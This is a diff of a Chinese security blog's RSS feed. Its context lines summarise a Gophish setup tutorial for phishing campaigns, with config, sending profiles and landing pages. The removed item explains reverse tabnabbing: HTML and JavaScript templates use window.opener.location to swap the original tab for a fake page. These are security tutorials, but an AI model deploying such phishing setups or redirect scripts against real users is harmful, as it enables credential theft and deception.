@@ -22,16 +22,5 @@
 { &amp;quot;admin_server&amp;quot;: { &amp;quot;listen_url&amp;quot;: &amp;quot;0.0.0.0:58001&amp;quot;, // Gophish 管理页面 &amp;quot;use_tls&amp;quot;: true, &amp;quot;cert_path&amp;quot;: &amp;quot;gophish.crt&amp;quot;, &amp;quot;key_path&amp;quot;: &amp;quot;gophish.key&amp;quot; }, &amp;quot;phish_server&amp;quot;: { &amp;quot;listen_url&amp;quot;: &amp;quot;0.0.0.0:58002&amp;quot;, // 钓鱼的 web 服务 &amp;quot;use_tls&amp;quot;: false, // 不使用 tls，web 服务地址为 http://x.x.x.x:58002/ &amp;quot;cert_path&amp;quot;: &amp;quot;gophish.crt&amp;quot;, &amp;quot;key_path&amp;quot;: &amp;quot;gophish.key&amp;quot; }, &amp;quot;db_name&amp;quot;: &amp;quot;sqlite3&amp;quot;, &amp;quot;db_path&amp;quot;: &amp;quot;gophish.db&amp;quot;, &amp;quot;migrations_prefix&amp;quot;: &amp;quot;db/db_&amp;quot;, &amp;quot;contact_address&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;logging&amp;quot;: { &amp;quot;filename&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;level&amp;quot;: &amp;quot;&amp;quot; } }  0x02 配置发送邮箱 Sending Profiles -&amp;gt; New Profile -&amp;gt; 填写相关信息 -&amp;gt; Send Test Email 收到测试邮件证明配置成功 0x03 编写钓鱼邮件内容 添加邮件模版，Add files 可以添加附件 其他模版例子 0x04 编写钓鱼页面 我的一个模版文件：Gophish 钓鱼页面模版.</description>
     </item>
     
-    <item>
-      <title>利用_blank属性钓鱼</title>
-      <link>https://wyb0.com/posts/2016/use-blank-attribute-to-fish/</link>
-      <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
-      
-      <guid>https://wyb0.com/posts/2016/use-blank-attribute-to-fish/</guid>
-      <description>0x00 _blank _blank是html中的标签属性，如&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;, 但若点击HELLO打开的网页1.php中有如下代码：
-&amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt;  则原网页将转跳到http://xss.reber.com/fish.html ，这就会造成钓鱼
-0x01 简单模板  a.html内容如下：  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   http://xss.reber.com/1.php中1.php内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   1.php同级下有个钓鱼模板fish.html，内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h2&amp;gt;This is fishing template!&amp;lt;/h2&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   点击a.</description>
-    </item>
-    
   </channel>
 </rss>
